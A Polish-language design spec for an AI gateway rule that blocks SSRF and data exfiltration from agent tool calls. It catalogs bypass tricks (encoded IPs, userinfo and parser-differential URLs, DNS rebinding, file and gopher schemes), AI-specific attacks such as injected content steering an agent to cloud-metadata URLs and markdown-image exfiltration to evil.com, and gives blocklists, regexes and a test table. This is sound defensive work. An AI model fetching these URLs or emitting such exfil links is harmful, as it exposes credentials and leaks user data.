# Network SSRF Guard and Domain Restriction
> **ID:** NET-001  | **Kategoria:** network | **Priorytet:** MUST | **Złożoność:** M | **Punkt egzekwowania:** tool-call (URL w argumentach), input (URL w prompcie przy pobieraniu), output (markdown image/link exfil), sieć (egress)

## 1. Overview
Chronimy sieć wewnętrzną, metadane chmury i usługi lokalne (Ollama na `:11434`, Postgres, sidecar FastAPI, panel gateway) przed żądaniami inicjowanymi przez agenta/narzędzia (SSRF), oraz kontrolujemy, dokąd dane mogą wychodzić (egress). W naszym systemie dotyczy to narzędzi typu `fetch`/`browse`/`http_request` w MCP, narzędzi RAG pobierających URL, a także samego gateway, gdy proxy'uje do Ollamy z URL konfigurowanego przez użytkownika.

## 2. Threat / Attack
1. Użytkownik lub wstrzyknięta treść każe agentowi „pobrać" URL, który wskazuje na zasób wewnętrzny.
2. Cele: `http://169.254.169.254/latest/meta-data/` (AWS/GCP/Azure IMDS, poświadczenia IAM), `http://localhost:11434/api/...` (Ollama bez uwierzytelnienia), `http://127.0.0.1:5432`, panele administracyjne, `http://[::1]/`, sieć LAN Raspberry Pi.
3. Techniki obejścia filtrów:
   - **Reprezentacje IP**: dziesiętna `http://2130706433/`, ósemkowa `0177.0.0.1`, szesnastkowa `0x7f.1`, skrócona `127.1`, mieszane.
   - **IPv6**: `[::1]`, IPv4-mapped `[::ffff:127.0.0.1]`, `[::ffff:7f00:1]`, NAT64 `64:ff9b::/96`, 6to4, zone id `[fe80::1%eth0]`, ULA `fc00::/7`, link-local `fe80::/10`.
   - **Userinfo trick**: `http://allowed.com@evil.com/`, `http://evil.com\@allowed.com`, `http://allowed.com#@evil.com` — rozbieżności parserów (Orange Tsai).
   - **Redirecty**: serwer na allowlistowanej domenie odpowiada 302 na `http://169.254.169.254/` (walidujemy tylko pierwszy URL).
   - **DNS rebinding / TOCTOU DNS**: domena rozwiązuje się najpierw na publiczny IP (przechodzi walidację), potem na 127.0.0.1 (przy właściwym połączeniu), TTL=0. Wild-card DNS typu `127.0.0.1.nip.io`.
   - **Schematy**: `file:///etc/passwd`, `gopher://` (surowy TCP do Redisa/SMTP), `dict://`, `ftp://`, `jar:`, `ldap://`.
   - **Rozbieżności URL parser vs requester**: walidacja jednym parserem, żądanie inną biblioteką (backslash, `;`, tabulatory/CR/LF w URL, Unicode w hostach/IDNA, trailing dot `localhost.`).
   - **Egress/exfiltracja**: dane wypływają przez `GET https://evil.com/?q=<sekret>` albo przez obraz markdown `![](https://evil.com/?d=...)` renderowany przez klienta (zero-click). Dotyczy też DNS exfil.
4. Inne: browser-based DNS rebinding do lokalnej Ollamy (patrz sekcja 3) – wymaga walidacji nagłówka `Host`/`Origin` po stronie gateway.

## 3. Real-World Evidence
| Tag | Przypadek | Mechanizm / komponent / wpływ / zapobieganie |
|---|---|---|
| [REAL-ATTACK] | **Capital One 2019** | SSRF w błędnie skonfigurowanym WAF na EC2 odpytał IMDSv1 `169.254.169.254`, zwrócił poświadczenia roli IAM, które posłużyły do pobrania danych ok. 106 mln klientów z S3. Reakcja AWS: IMDSv2 (token sesji). Zapobieganie: blokada link-local, IMDSv2 `hop-limit=1`, least privilege. Źródło: sekcja 15 (agregaty wtórne; sprawy sądowej DOJ nie weryfikowałem bezpośrednio). |
| [CONFIRMED-VULN] | **CVE-2025-65958** Open WebUI (<0.6.37) | Uwierzytelniony użytkownik zmusza serwer do żądań na dowolne URL (metadane chmury, sieć wewnętrzna). Lokalny front-end dla Ollamy — bardzo bliski naszemu środowisku. |
| [CONFIRMED-VULN] | **CVE-2026-45400** Open WebUI (<0.9.5, CVSS 8.5) | Obejście ochrony SSRF przez rozbieżność `urlparse` vs `requests`: URL `http://127.0.0.1:6666\@1.1.1.1` — walidator widzi 1.1.1.1, requester łączy się z 127.0.0.1. Dokładnie klasa „parser differential". |
| [CONFIRMED-VULN] | **CVE-2026-45347** Open WebUI (<0.5.11) | Blind SSRF przez funkcję generowania PDF. (Opis z bazy GitLab Advisory, szczegółów nie weryfikowałem.) |
| [CONFIRMED-VULN] | **CVE-2025-59527** Flowise 3.0.5 (endpoint `/api/v1/fetch-links`) | Serwer jako proxy do usług wewnętrznych; poprawione w 3.0.6. |
| [CONFIRMED-VULN] | **CVE-2023-46229** LangChain <0.0.317 (`recursive_url_loader`) | Crawler przechodzi z zewnętrznego serwera na wewnętrzny. |
| [CONFIRMED-VULN] | **CVE-2026-26013** langchain-core | `ChatOpenAI.get_num_tokens_from_messages()` pobiera dowolne `image_url` bez walidacji (SSRF przy liczeniu tokenów). |
| [CONFIRMED-VULN] | **CVE-2026-58196** ToolHive (<0.31.0) | Złośliwy zdalny serwer MCP podaje `resource_metadata` w `WWW-Authenticate`; klient podąża za redirectami bez ograniczeń hosta/schematu, GET na link-local/RFC1918. Przykład SSRF *od strony klienta MCP*. |
| [CONFIRMED-VULN] | **CVE-2024-28224** Ollama (<0.1.29, NCC Group) | DNS rebinding pozwala stronie WWW wywoływać pełne API Ollamy na maszynie użytkownika (odczyt plików modeli, czat, usuwanie, DoS). Wniosek: Ollama za gateway musi słuchać tylko na loopbacku/segmencie prywatnym i nie ufać nagłówkowi `Host`. |
| [CONFIRMED-VULN] | **CVE-2024-4032** CPython `ipaddress` | `is_private`/`is_global` zwracały błędne wartości dla części zakresów IANA (poprawione w 3.12.4 / 3.13.0a6 i backportach). Wniosek: nie polegać ślepo na gotowych `is_private()`, utrzymywać własną listę CIDR + testy. |
| [RESEARCH] | **Orange Tsai, „A New Era of SSRF"** (Black Hat USA 2017) | Rozbieżności parserów i requesterów w Python/PHP/Perl/Ruby/Java/JS/curl/wget; >20 podatności, łańcuch do RCE na GitHub Enterprise. Podstawa sekcji 4 pkt 2-4. |
| [MITIGATION] | **OWASP SSRF Prevention Cheat Sheet** | Allowlista, walidacja IP po rozwiązaniu DNS, brak redirectów lub ich ponowna walidacja, blokada schematów. |
| [VENDOR-CLAIM] | Blogi agregujące (securityscientist.net, gecko.security) | Wtórne, użyte tylko jako kontekst. |

## 4. Deterministic Detection
Kolejność kroków (fail closed). **Kluczowa zasada: walidacja i połączenie muszą używać tego samego sparsowanego URL i tego samego zweryfikowanego IP.**
1. **Wyodrębnij URL-e** z argumentów narzędzia (pola typu `uri`/`url` w schemacie + regex `(?i)\b[a-z][a-z0-9+.-]*://` w pozostałych stringach).
2. **Schemat**: allowlista (`https`, ewentualnie `http`); blokuj `file`, `gopher`, `dict`, `ftp`, `jar`, `ldap`, `data` (dla fetch), `javascript`.
3. **Parsowanie jednym, ścisłym parserem** (Java: `java.net.URI` + dodatkowo odrzucenie, gdy `URI.getHost() == null`, gdy w URL są `\`, tab, CR/LF, spacje, znaki kontrolne, `@` w authority (userinfo — zablokuj całkowicie), wiele `#`). Odrzucenie zamiast „naprawiania".
4. **Host**: IDNA/punycode normalizacja, lowercase, usunięcie trailing dot, odrzucenie formatów liczbowych (cały host złożony z cyfr/hex/kropek poza kanonicznym dotted-quad) — parsuj IP samodzielnie (`InetAddress.getByAddress` po własnej tokenizacji, nie `getByName` na nieznanym stringu, bo rozwiązuje `127.1`, `0x7f.1`).
5. **Rozwiąż DNS raz** (wszystkie rekordy A i AAAA), sprawdź **każdy** adres względem zablokowanych CIDR: `0.0.0.0/8`, `10/8`, `100.64/10`, `127/8`, `169.254/16` (w tym 169.254.169.254, 169.254.170.2), `172.16/12`, `192.0.0/24`, `192.168/16`, `198.18/15`, `224/4`, `240/4`; IPv6: `::/128`, `::1`, `::ffff:0:0/96` (sprawdź osadzone IPv4 po rozpakowaniu), `64:ff9b::/96`, `fc00::/7`, `fe80::/10`, `ff00::/8`, `2002::/16`; hosty metadanych: `metadata.google.internal`, `metadata.azure.com`, `instance-data`.
6. **Pinning IP**: połącz się dokładnie z zweryfikowanym adresem (Netty/Reactor `AddressResolverGroup` własny resolver, SNI/Host z oryginalnej nazwy). To jedyna skuteczna obrona przed DNS rebinding.
7. **Redirecty**: wyłącz auto-follow; ręcznie podążaj max N (np. 3) razy i **dla każdego Location uruchom kroki 2-6**.
8. **Port**: allowlista (80, 443; opcjonalnie dodatkowe), blokada portów wewnętrznych (11434, 5432, 6379, 8080 gateway).
9. **Allowlista domen** (tryb preferowany): dokładne lub sufiksowe dopasowanie na granicy etykiety DNS (`.example.com`, a nie `endsWith("example.com")` — `evilexample.com`!). Denylista (tryb pomocniczy): znane domeny wyciekowe/paste (`webhook.site`, `pastebin.com`, `requestbin`, `ngrok`, `*.trycloudflare.com`, `oast.*`, `burpcollaborator`) — słabsza, patrz sekcja 7.
10. **Egress w outputach**: wykryj w odpowiedzi LLM obrazy/linki markdown `![...](https?://...)` i HTML `<img src>` do domen spoza allowlisty; zwłaszcza z długim query stringiem (exfil). Zastąp placeholderem lub usuń.
11. **Nagłówek Host/Origin** dla ruchu do gateway/Ollamy: odrzucaj `Host` spoza listy (obrona przed DNS rebinding z przeglądarki, CVE-2024-28224).

## 5. Detection Pipeline
Request → Canonicalization (URL strict parse, NFKC, IDNA) → AuthN → Policy (profil sieciowy agenta: allow-domains, porty) → Rules (NET-001..NET-009) → [Resolver z pinningiem + egress firewall] → LLM/MCP → Output (NET-008 skan linków/obrazów) → Response. Dwie warstwy: (a) filtr gateway na `tools/call` i wywołaniach z URL, (b) twarda zapora egress (iptables/nftables, kontener w sieci bez trasy do LAN) jako ostatnia linia.

## 6. Possible Actions
- **BLOCK**: IP prywatne/metadata/loopback, zakazany schemat, userinfo, zakazany port, domena spoza allowlisty (tryb strict).
- **REVIEW**: domena nieznana w trybie „learning"; nowe domeny w produkcji.
- **REDACT**: zewnętrzne obrazy/linki w outputach (zamiana na tekst).
- **RATE_LIMIT / QUARANTINE**: sesja próbująca wielu różnych internal hosts (skanowanie portów) -> QUARANTINE.
- **ALLOW**: publiczny IP po rozwiązaniu, domena z allowlisty, brak redirectu poza politykę.

## 7. Bypass / Limitations
- **DNS rebinding** pokonuje walidację bez pinningu — pinning w warstwie HTTP clienta jest obowiązkowy; sama pre-walidacja `InetAddress.getByName` nie wystarczy (TOCTOU).
- **Rozbieżności parserów** (CVE-2026-45400): jedyne pewne podejście to jeden parser/jedno zapytanie albo odrzucanie wszystkiego niejednoznacznego.
- **Denylista domen** jest trywialnie omijana (nowa domena, subdomena, shortener, redirector na allowlistowanym hoście = open redirect). Allowlista + redirect re-validation jest właściwa.
- **Open redirect na dozwolonej domenie**: pokrywa re-walidacja redirectów, ale nie pokrywa proxy typu `translate.google.com/translate?u=...` (allowlista powinna być precyzyjna do ścieżki).
- **Brak widoczności w ruchu spoza gateway**: narzędzie MCP, które samo wykonuje HTTP z własnego procesu, omija nasz filtr; wymaga egress firewall i/lub forward proxy z egzekucją (np. Squid) jako jedynej trasy.
- **Ruch nie-HTTP** (DNS exfil, raw TCP) nie jest widoczny na warstwie URL. Mitygacja: DNS resolver z logowaniem i blokadą, brak bezpośredniego egress.
- **False positives**: legalne zasoby w sieci lokalnej (RPi + LAN) – wymagają jawnych wyjątków per agent. Allowlista wymaga utrzymania.
- **Wydajność**: dodatkowe wywołanie DNS; cache TTL-owy z pinningiem na czas jednego żądania (nie dłuższy niż TTL).

## 8. Deterministic vs AI
Deterministycznie: schematy, IP/CIDR, DNS, redirecty, porty, allowlista, parsowanie. To rozstrzygalne.
Sidecar/AI: ocena, czy dozwolona domena jest używana jako kanał exfiltracji (np. kodowane dane w ścieżce/query, długie base64 w parametrach do legalnej domeny), wykrywanie injection kierującego agenta do „odwiedzenia" URL, ocena reputacji nieznanej domeny (bez usług płatnych — offline: lokalna lista/entropia DGA). Granica: adres = deterministycznie, *treść wysyłana* = DLP/entropia (pokrewne SEC/PII) + semantyka.

## 9. Implementation Options
- **Java/SCG**: `SsrfGuardGatewayFilterFactory` + własny `AddressResolverGroup`/`Reactor Netty HttpClient` z resolverem pinującym dla wychodzących wywołań narzędzi; `WebClient` z `followRedirect(false)`. Biblioteka CIDR: `inet.ipaddr:ipaddress` (IPAddress, Apache 2.0) – dobra obsługa IPv4/IPv6 i mapped. Parsowanie: `java.net.URI` + własne reguły; ewentualnie `com.google.common.net.InetAddresses` (Guava) do parsowania literałów.
- **Python sidecar** (jeśli narzędzia fetch żyją tam): `ipaddress` (uwaga CVE-2024-4032, aktualny Python), `httpx` z własnym transportem pinującym.
- **OS/infra**: nftables allow-by-default-deny egress, Docker network `internal: true`, osobna sieć dla fetch-workera, IMDS niedostępny (RPi i tak go nie ma, ale test musi obejmować).
- Hosty w LAN: segmentacja VLAN.

## 10. Existing Open Source
| Nazwa | Link | Język | Licencja | Zastosowanie | Zalety | Wady | Trudność | Offline? | Przydatność |
|---|---|---|---|---|---|---|---|---|---|
| Stripe Smokescreen | https://github.com/stripe/smokescreen | Go | MIT | Forward proxy z egzekucją ACL i blokadą IP wewnętrznych | Sprawdzony produkcyjnie, ACL per rola | Osobny proces, Go | Średnia | tak | Wysoka (egress proxy) |
| Squid | https://www.squid-cache.org/ | C++ | GPLv2 | Forward proxy + ACL domen | Dojrzały | Konfiguracja złożona | Średnia | tak | Średnia |
| ipaddress (Java: seancfoley) | https://github.com/seancfoley/IPAddress | Java | Apache-2.0 | Parsowanie/CIDR IPv4/6 | Pełna obsługa mapped/zon | Zależność | Niska | tak | Wysoka |
| Guava InetAddresses | https://github.com/google/guava | Java | Apache-2.0 | Literały IP | Prosty | Brak CIDR | Niska | tak | Średnia |
| Advocate (Python) | https://github.com/JordanMilne/Advocate | Python | Apache-2.0 | `requests` z ochroną SSRF i pinningiem | Gotowe | Projekt mało aktywny (niezweryfikowane) | Niska | tak | Średnia |
| ssrf_filter (Ruby) / SafeURL / ssrf-req-filter (Node) | https://github.com/arkadiyt/ssrf_filter | Ruby | MIT | Referencje implementacji pinningu | Wzorzec | Nie nasz stack | – | tak | Niska (wzorzec) |
| OWASP SSRF Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html | – | CC | Wytyczne | Autorytet | – | – | tak | Wysoka |

## 11. Proposed Control
- NET-001 Blokada zakresów prywatnych/loopback/link-local/metadata po rozwiązaniu DNS (BLOCK, CRITICAL)
- NET-002 Zabronione schematy (file/gopher/dict/ftp/...) (BLOCK, HIGH)
- NET-003 Obfuskowane IP (dec/oct/hex/skrócone) i IPv6 mapped/NAT64/zone (BLOCK, HIGH)
- NET-004 Userinfo i URL parser differential: `@`, `\`, kontrolne, wielokrotne `#` (BLOCK, HIGH)
- NET-005 Redirecty re-walidowane, max 3 (BLOCK przy naruszeniu)
- NET-006 DNS pinning, odrzucenie rebinding (BLOCK; implementacja w kliencie HTTP)
- NET-007 Allowlista domen/portów per agent (BLOCK domyślnie, REVIEW w trybie uczącym)
- NET-008 Egress w outputach: zewnętrzne obrazy/linki z danymi w query (REDACT)
- NET-009 Walidacja `Host`/`Origin` do gateway i Ollamy (BLOCK)
- NET-010 Denylista domen exfil/OAST (BLOCK, pomocnicza, MEDIUM)

## 12. Example Configuration
```yaml
- id: NET-001
  name: Block private, loopback, link-local and metadata destinations
  category: network
  enabled: true
  priority: 10
  scope: { direction: [tool-call, input], agents: ["*"], tools: ["fetch","browse","http_request"], environments: ["*"] }
  conditions: { resolve_dns: true, check_all_records: true }
  matcher:
    type: ip_cidr
    deny_cidrs: ["0.0.0.0/8","10.0.0.0/8","100.64.0.0/10","127.0.0.0/8","169.254.0.0/16","172.16.0.0/12","192.0.0.0/24","192.168.0.0/16","198.18.0.0/15","224.0.0.0/4","240.0.0.0/4","::1/128","::/128","fc00::/7","fe80::/10","ff00::/8","64:ff9b::/96","2002::/16"]
    unwrap_ipv4_mapped: true
    deny_hosts: ["metadata.google.internal","metadata.azure.com","instance-data"]
  action: BLOCK
  severity: CRITICAL
  threshold: null
  exceptions: []   # e.g. explicit per-agent allow of a LAN host
  metadata: { owasp: [LLM06, "OWASP-A10-SSRF"], cwe: [CWE-918], references: ["Capital One 2019","CVE-2025-65958"] }

- id: NET-002
  name: Forbidden URL schemes
  category: network
  enabled: true
  priority: 5
  scope: { direction: [tool-call, input], agents: ["*"], tools: [], environments: ["*"] }
  conditions: {}
  matcher: { type: url_scheme, allow: ["https","http"], deny: ["file","gopher","dict","ftp","jar","ldap","data","javascript"] }
  action: BLOCK
  severity: HIGH
  threshold: null
  exceptions: []
  metadata: { owasp: [LLM06], cwe: [CWE-918], references: [] }

- id: NET-004
  name: Userinfo and URL parser-differential tricks
  category: network
  enabled: true
  priority: 6
  scope: { direction: [tool-call, input], agents: ["*"], tools: [], environments: ["*"] }
  conditions: {}
  matcher:
    type: regex
    pattern: '(?i)^[a-z][a-z0-9+.-]*://[^/?#]*[@\\]|[\t\r\n\x00-\x1f]|#.*#'
  action: BLOCK
  severity: HIGH
  threshold: null
  exceptions: []
  metadata: { owasp: [LLM06], cwe: [CWE-918, CWE-1286], references: ["CVE-2026-45400","Orange Tsai BH2017"] }

- id: NET-007
  name: Domain and port allowlist
  category: network
  enabled: true
  priority: 40
  scope: { direction: [tool-call], agents: ["research-agent"], tools: ["fetch"], environments: ["prod"] }
  conditions: {}
  matcher:
    type: domain_allowlist
    domains: [".wikipedia.org", "docs.spring.io"]   # label-boundary suffix match
    ports: [443]
    follow_redirects: { max: 3, revalidate_each: true }
  action: BLOCK
  severity: HIGH
  threshold: null
  exceptions: []
  metadata: { owasp: [LLM06], references: ["OWASP SSRF Cheat Sheet"] }

- id: NET-008
  name: Remote images or links in LLM output carrying data in query
  category: network
  enabled: true
  priority: 210
  scope: { direction: [output], agents: ["*"], tools: [], environments: ["*"] }
  conditions: { host_not_in_allowlist: true }
  matcher: { type: regex, pattern: '!\[[^\]]*\]\((https?://[^)\s]+\?[^)\s]{16,})\)' }
  action: REDACT
  severity: MEDIUM
  threshold: null
  exceptions: []
  metadata: { owasp: [LLM02, LLM05], references: [] }
```

## 13. Example Requests
```json
{"method":"tools/call","params":{"name":"fetch","arguments":{"url":"https://en.wikipedia.org/wiki/Poland"}}}
```
-> `ALLOW` (publiczny IP, domena z allowlisty).
```json
{"method":"tools/call","params":{"name":"fetch","arguments":{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}}
```
-> `{"decision":"BLOCK","rule":"NET-001"}`
```json
{"method":"tools/call","params":{"name":"fetch","arguments":{"url":"http://2130706433:11434/api/tags"}}}
```
-> `BLOCK NET-003` (dziesiętne 127.0.0.1).
```json
{"method":"tools/call","params":{"name":"fetch","arguments":{"url":"http://docs.spring.io@evil.com/"}}}
```
-> `BLOCK NET-004`.
Redirect: `https://docs.spring.io/r` -> 302 `http://127.0.0.1:11434/` -> `BLOCK NET-005` w trakcie.

## 14. Testing
| ID | Input | Oczekiwany wynik |
|---|---|---|
| NET-T001 | `https://en.wikipedia.org/` (allowlista) | ALLOW |
| NET-T002 | `http://169.254.169.254/latest/meta-data/` | BLOCK NET-001 |
| NET-T003 | `http://localhost:11434/api/tags` | BLOCK NET-001 |
| NET-T004 | `http://127.0.0.1/` / `http://127.1/` | BLOCK NET-001/003 |
| NET-T005 | `http://2130706433/` | BLOCK NET-003 |
| NET-T006 | `http://0x7f.0.0.1/`, `http://0177.0.0.1/` | BLOCK NET-003 |
| NET-T007 | `http://[::1]/` | BLOCK NET-001 |
| NET-T008 | `http://[::ffff:127.0.0.1]/`, `http://[::ffff:7f00:1]/` | BLOCK NET-003 |
| NET-T009 | `http://[64:ff9b::7f00:1]/` | BLOCK NET-003 |
| NET-T010 | `file:///etc/passwd` | BLOCK NET-002 |
| NET-T011 | `gopher://127.0.0.1:6379/_...` | BLOCK NET-002 |
| NET-T012 | `http://allowed.com@evil.com/` | BLOCK NET-004 |
| NET-T013 | `http://127.0.0.1:6666\@1.1.1.1` (CVE-2026-45400) | BLOCK NET-004 |
| NET-T014 | `http://localhost.` (trailing dot) | BLOCK NET-001 |
| NET-T015 | domena -> rekord A 10.0.0.5 (rebinding statyczny) | BLOCK NET-001 |
| NET-T016 | domena z 2 rekordami A (publiczny + 127.0.0.1) | BLOCK NET-001 (wszystkie rekordy) |
| NET-T017 | DNS rebinding: pierwsze rozwiązanie publiczne, drugie 127.0.0.1 | Połączenie idzie na pinned IP; test integracyjny: brak połączenia z 127.0.0.1 |
| NET-T018 | allowlistowany host 302 -> `http://169.254.169.254/` | BLOCK NET-005 |
| NET-T019 | `https://evilexample.com` przy allowlist `.example.com` | BLOCK NET-007 (granica etykiety) |
| NET-T020 | port 6379 na publicznym IP | BLOCK NET-007 |
| NET-T021 | output `![x](https://evil.com/?d=<base64 64 znaki>)` | REDACT NET-008 |
| NET-T022 | `Host: attacker.com` do gateway/Ollamy | BLOCK NET-009 |
| NET-T023 | `https://webhook.site/uuid` | BLOCK NET-010 |
| NET-T024 | (bypass) legalna domena z allowlisty używana jako exfil kanał (długi base64 w ścieżce) | Deterministycznie nie wykryte; wymaga sidecara/DLP (oczekiwany REVIEW) |

## 15. Sources
- OWASP SSRF Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html — [MITIGATION]
- Orange Tsai, A New Era of SSRF (Black Hat USA 2017) — https://infocondb.org/con/black-hat/black-hat-usa-2017/a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages — 2017-07 — [RESEARCH]
- Open WebUI CVE-2025-65958 — https://advisories.gitlab.com/pypi/open-webui/CVE-2025-65958/ — [CONFIRMED-VULN]
- Open WebUI CVE-2026-45400 — https://advisories.gitlab.com/pypi/open-webui/CVE-2026-45400/ ; https://mend.io/vulnerability-database/CVE-2026-45400/ — [CONFIRMED-VULN]
- Open WebUI CVE-2026-45347 — https://advisories.gitlab.com/pypi/open-webui/CVE-2026-45347/ — [CONFIRMED-VULN]
- Flowise CVE-2025-59527 — https://db.gcve.eu/vuln/cve-2025-59527 — [CONFIRMED-VULN]
- LangChain CVE-2023-46229 — https://advisories.gitlab.com/pkg/pypi/langchain/CVE-2023-46229/ — [CONFIRMED-VULN]
- langchain-core CVE-2026-26013 — https://advisories.gitlab.com/pypi/langchain-core/CVE-2026-26013/ — [CONFIRMED-VULN]
- ToolHive CVE-2026-58196 — https://mend.io/vulnerability-database/CVE-2026-58196/ — [CONFIRMED-VULN]
- NCC Group, Ollama DNS rebinding CVE-2024-28224 — https://www.nccgroup.com/research/technical-advisory-ollama-dns-rebinding-attack-cve-2024-28224/ — 2024-04 — [CONFIRMED-VULN]
- Python security-announce, CVE-2024-4032 — https://mail.python.org/archives/list/security-announce@python.org/thread/NRUHDUS2IV2USIZM2CVMSFL6SCKU3RZA/ — [CONFIRMED-VULN]
- Capital One 2019 (SSRF/IMDSv1) — https://www.fastly.com/blog/preventing-server-side-request-forgery-ssrf ; https://techearl.com/capital-one-breach-ssrf — [REAL-ATTACK] (źródła wtórne)
- Wymienione projekty OSS (Smokescreen, Advocate, ssrf_filter, IPAddress) — niezweryfikowane w tej sesji (linki z wiedzy ogólnej, sprawdzić licencje i aktywność przed użyciem).
